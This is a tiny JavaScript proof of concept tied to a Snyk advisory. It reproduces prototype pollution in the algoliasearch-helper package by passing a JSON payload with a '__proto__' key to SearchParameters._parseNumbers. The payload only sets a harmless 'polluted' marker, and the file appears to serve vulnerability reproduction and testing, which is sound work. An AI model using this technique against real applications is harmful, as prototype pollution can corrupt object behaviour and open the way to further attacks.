//https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421
 
  const algohelp = require("algoliasearch-helper");
  let payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

   

  algohelp.SearchParameters._parseNumbers(payload); // {}
// End of file
